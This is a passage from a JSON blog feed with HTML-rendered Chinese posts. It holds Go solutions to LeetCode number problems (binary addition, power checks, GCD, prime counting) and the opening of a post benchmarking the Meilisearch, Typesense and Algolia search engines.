punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"7-二进制求和\"><a class=\"anchor\" href=\"#7-二进制求和\">#</a> 7. 二进制求和</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9hZGQtYmluYXJ5L2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/add-binary/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfMi5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_2.go</span></p>\n<blockquote>\n<p>给你两个二进制字符串  <code>a</code>  和  <code>b</code>  ，以二进制字符串的形式返回它们的和。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">addBinary</span><span class=\"token punctuation\">(</span>a <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> b <span class=\"token builtin\">string</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">string</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tindexA<span class=\"token punctuation\">,</span> indexB <span class=\"token operator\">:=</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">if</span> indexA <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> b</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> indexB <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tcarry <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">for</span> indexA <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> indexB <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> indexA <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\tcarry <span class=\"token operator\">+=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>indexA<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token char\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> indexB <span class=\"token operator\">>=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t\tcarry <span class=\"token operator\">+=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>indexB<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token char\">'0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> <span class=\"token function\">byte</span><span class=\"token punctuation\">(</span><span class=\"token char\">'0'</span><span class=\"token operator\">+</span>carry<span class=\"token operator\">%</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tcarry <span class=\"token operator\">=</span> carry <span class=\"token operator\">/</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tindexA<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\tindexB<span class=\"token operator\">--</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token keyword\">if</span> carry <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\tans <span class=\"token operator\">=</span> <span class=\"token function\">append</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">,</span> <span class=\"token char\">'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\tans<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ans<span class=\"token punctuation\">[</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>i<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ans<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"幂运算\"><a class=\"anchor\" href=\"#幂运算\">#</a> 幂运算</h2>\n<h3 id=\"8-判断-2的幂\"><a class=\"anchor\" href=\"#8-判断-2的幂\">#</a> 8. 判断 2 的幂</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wb3dlci1vZi10d28vZGVzY3JpcHRpb24v\">https://leetcode.cn/problems/power-of-two/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_3.go</span></p>\n<blockquote>\n<p>给你一个整数  <code>n</code> ，请你判断该整数是否是 2 的幂次方。如果是，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n<p>如果存在一个整数  <code>x</code>  使得  <code>n == 2x</code>  ，则认为  <code>n</code>  是 2 的幂次方。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 1000</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 0111</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPowerOfTwo</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> n<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"9-判断-3的幂\"><a class=\"anchor\" href=\"#9-判断-3的幂\">#</a> 9. 判断 3 的幂</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wb3dlci1vZi10aHJlZS9kZXNjcmlwdGlvbi8=\">https://leetcode.cn/problems/power-of-three/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfNC5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_4.go</span></p>\n<blockquote>\n<ul>\n<li>给定一个整数，写一个函数来判断它是否是 3 的幂次方。如果是，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</li>\n</ul>\n<p>整数  <code>n</code>  是 3 的幂次方需满足：存在整数  <code>x</code>  使得  <code>n == 3x</code></p>\n<p>在 32 位有符号整数的范围内，最大的 3 的幂次方是 $3^{19} = 1162261467</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPowerOfThree</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">// n, i := 1, 0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">// for n &lt; math.MaxInt32 &#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// \tn = int(math.Pow(3, float64(i)))</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">// \ti++</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">// \tfmt.Println(i, n)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// &#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// return true</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token number\">1162261467</span><span class=\"token operator\">%</span>n <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"10-判断-4的幂\"><a class=\"anchor\" href=\"#10-判断-4的幂\">#</a> 10. 判断 4 的幂</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9wb3dlci1vZi1mb3VyL2Rlc2NyaXB0aW9uLw==\">https://leetcode.cn/problems/power-of-four/description/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzIvdG9waWNfNS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_2/topic_5.go</span></p>\n<blockquote>\n<p>给定一个整数，写一个函数来判断它是否是 4 的幂次方。如果是，返回  <code>true</code>  ；否则，返回  <code>false</code>  。</p>\n<p>整数  <code>n</code>  是 4 的幂次方需满足：存在整数  <code>x</code>  使得  <code>n == 4x</code></p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPowerOfFour</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">//      1\t1</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token comment\">//    100\t4</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">//  10000\t16</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token comment\">//1000000\t64</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">return</span> n <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> n<span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> n<span class=\"token operator\">&amp;</span><span class=\"token number\">0xaaaaaaaa</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"最大公约数\"><a class=\"anchor\" href=\"#最大公约数\">#</a> 最大公约数</h2>\n<h3 id=\"11-最大公约数\"><a class=\"anchor\" href=\"#11-最大公约数\">#</a> 11. 最大公约数</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzMvdG9waWNfMS5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_3/topic_1.go</span></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 辗转相除法 (欧几里得算法)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 求最大公约数 GCD (Greatest Common Divisor)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// eg1:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">// 12，18 的公因数有：1，2，3，6。</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// gcd（12，18）=gcd(18,12%18)=gcd(18,12)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// gcd（18，12）=gcd(12,18%12)=gcd(12,6)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">// gcd（12，6）=gcd(6,12%6)=gcd(6,0)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// return 6</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">gcd</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\tk <span class=\"token operator\">:=</span> a <span class=\"token operator\">%</span> b</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\ta<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> k</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">for</span> k <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\tk <span class=\"token operator\">=</span> a <span class=\"token operator\">%</span> b</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\ta<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> k</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">return</span> a</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"质数和合数\"><a class=\"anchor\" href=\"#质数和合数\">#</a> 质数和合数</h2>\n<h3 id=\"12-判断质数\"><a class=\"anchor\" href=\"#12-判断质数\">#</a> 12. 判断质数</h3>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">isPrime</span><span class=\"token punctuation\">(</span>num <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">bool</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tmax <span class=\"token operator\">:=</span> math<span class=\"token punctuation\">.</span><span class=\"token function\">Sqrt</span><span class=\"token punctuation\">(</span><span class=\"token function\">float64</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token function\">int</span><span class=\"token punctuation\">(</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> num<span class=\"token operator\">%</span>i <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"13-计算质数数量\"><a class=\"anchor\" href=\"#13-计算质数数量\">#</a> 13. 计算质数数量</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS5jbi9wcm9ibGVtcy9jb3VudC1wcmltZXMv\">https://leetcode.cn/problems/count-primes/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9BbGdvcml0aG1DYW1wMjAyMy9ibG9iL21haW4vMTNfTnVtYmVyL2xldmVsXzMvdG9waWNfMy5nbw==\">https://github.com/Twelveeee/AlgorithmCamp2023/blob/main/13_Number/level_3/topic_3.go</span></p>\n<blockquote>\n<p>给定整数  <code>n</code>  ，返回 <em>所有小于非负整数  <code>n</code>  的质数的数量</em> 。</p>\n</blockquote>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">countPrimes</span><span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">int</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tprimeList <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tans <span class=\"token operator\">:=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>primeList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t\tans <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> i<span class=\"token operator\">*</span>i <span class=\"token operator\">&lt;</span> n <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">for</span> j <span class=\"token operator\">:=</span> i <span class=\"token operator\">*</span> i<span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> j <span class=\"token operator\">+=</span> i <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\tprimeList<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">return</span> ans</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "计算机科学",
                "算法训练2023",
                "数据结构",
                "算法"
            ]
        },
        {
            "id": "https://blog.twelveeee.top/2023/Search/searchEngineResearch/",
            "url": "https://blog.twelveeee.top/2023/Search/searchEngineResearch/",
            "title": "搜索引擎调研",
            "date_published": "2023-12-02T09:00:00.000Z",
            "content_html": "<h1 id=\"搜索引擎调研\"><a class=\"anchor\" href=\"#搜索引擎调研\">#</a> 搜索引擎调研</h1>\n<p>调研 Meilisearch vs Typesense vs Algolia</p>\n<p>github : <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9zZWFyY2hFbmdpbmVUZXM=\">https://github.com/Twelveeee/searchEngineTes</span></p>\n<p>Meilisearch vs Typesense vs Algolia</p>\n<p>这三个引擎进行实际的调研，</p>\n<p>他们的区别 ：<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWVpbGlzZWFyY2guY29tL2RvY3MvbGVhcm4vd2hhdF9pc19tZWlsaXNlYXJjaC9jb21wYXJpc29uX3RvX2FsdGVybmF0aXZlcw==\">meilisearch</span> 、 <span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXBlc2Vuc2Uub3JnL3R5cGVzZW5zZS12cy1hbGdvbGlhLXZzLWVsYXN0aWNzZWFyY2gtdnMtbWVpbGlzZWFyY2gv\">typesense</span></p>\n<p>官网</p>\n<p>Meilisearch ：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWVpbGlzZWFyY2guY29tLw==\">https://www.meilisearch.com/</span></p>\n<p>Typesense：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90eXBlc2Vuc2Uub3JnLw==\">https://typesense.org/</span></p>\n<p>Algolia：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYWxnb2xpYS5jb20v\">https://www.algolia.com/</span></p>\n<p>Algolia 为第三方托管的服务，没办法自己搭建，所以没有压测</p>\n<h1 id=\"背景\"><a class=\"anchor\" href=\"#背景\">#</a> 背景</h1>\n<p>服务器为一台 4C8G 的机器<br />\n数据量大概为 5000 条左右 document</p>\n<p>关注的指标，性能和响应时间，中文搜索能力</p>\n<h1 id=\"流程\"><a class=\"anchor\" href=\"#流程\">#</a> 流程</h1>\n<p>建立测试环境</p>\n<p>导入测试数据</p>\n<p>进行 10 次查询，取查询耗时平均值</p>\n<p>进行一分钟内进行不限次数查询，记录总查询次数，平均查询耗时，最高查询耗时，最低查询耗时</p>\n<p>进行中文关联性查询，手动评分</p>\n<h1 id=\"环境说明\"><a class=\"anchor\" href=\"#环境说明\">#</a> 环境说明</h1>\n<p>测试机器一台，4C8G，cpu 为 intel N100</p>\n<p>数据为 3000 条</p>\n<p>meilisearch 1.5.0</p>\n<p>typesense 0.25.1</p>\n<h1 id=\"开始\"><a class=\"anchor\" href=\"#开始\">#</a> 开始</h1>\n<h2 id=\"install\"><a class=\"anchor\" href=\"#install\">#</a> Install</h2>\n<h3 id=\"pre-compiled-executables\"><a class=\"anchor\" href=\"#pre-compiled-executables\">#</a> Pre-compiled executables</h3>\n<p>Get them <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1R3ZWx2ZWVlZS9zZWFyY2hFbmdpbmVUZXN0L3JlbGVhc2Vz\">here</span>.</p>\n<h2 id=\"useage-manual\"><a class=\"anchor\" href=\"#useage-manual\">#</a> Useage manual</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>NAME:</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   searchEngineTest - Twelveeee</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>USAGE:</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>   searchEngineTest <span class=\"token punctuation\">[</span>global options<span class=\"token punctuation\">]</span> <span class=\"token builtin class-name\">command</span> <span class=\"token punctuation\">[</span>command options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>arguments<span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>VERSION:</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>   v0.0.2</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>DESCRIPTION:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   搜索引擎测试</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>COMMANDS:</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   importData, i     init data</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   createIndex, ci   create index</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   deleteIndex, di   delete index</pre></td></tr><tr><td 